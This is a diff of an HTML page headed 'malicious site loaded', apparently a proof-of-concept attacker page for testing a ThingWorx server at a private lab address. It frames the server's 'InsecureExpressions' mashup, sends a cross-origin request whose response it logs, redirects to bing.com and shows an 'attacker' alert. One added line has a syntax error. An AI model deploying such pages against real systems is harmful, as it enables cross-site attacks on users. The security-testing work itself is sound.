@@ -6,6 +6,8 @@
   </head>
   <body>
     <h2> malicious site loaded </h2>
+
+    <iframe id="test" src="https://192.168.48.147/Thingworx/Runtime/index.html?mashup=InsecureExpressions"> </iframe>
     <script type="text/javascript">
       
       let xhr = new XMLHttpRequest();
@@ -15,11 +17,11 @@
       xhr.send();
       xhr.onload = function (){
         console.log(xhr.responseText);
-      };     
+      };
+      console.log(window.document.getElementById("test");
+      window.location = "https://www.bing.com"
+      alert("hello from attacker");
     </script>
-    <iframe src="http://192.168.48.147/Thingworx/Runtime/index.html?mashup=InsecureExpressions"> </iframe>
-    
-    window.location = "https://www.bing.com"
-    alert("hello from attacker");
+
   </body>
 </html>
